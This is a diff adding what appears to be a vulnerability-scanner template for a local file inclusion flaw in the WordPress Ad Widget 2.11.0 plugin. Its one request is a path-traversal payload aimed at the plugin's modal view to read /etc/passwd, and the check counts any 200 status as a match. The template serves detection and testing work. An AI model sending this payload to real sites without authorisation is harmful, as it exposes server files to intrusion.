@@ -1,0 +1,23 @@
+id: ad-widget-lfi
+brief:
+    title: WordPress Ad Widget 2.11.0 - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: WordPress Ad Widget 2.11.0 is vulnerable to local file inclusion. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.
+    label:
+        - wordpress
+        - wp-plugin
+        - lfi
+        - wp
+        - adWidget
+        - wpscan
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00'
+      signs:
+        - "on": status
+          status:
+            - 200
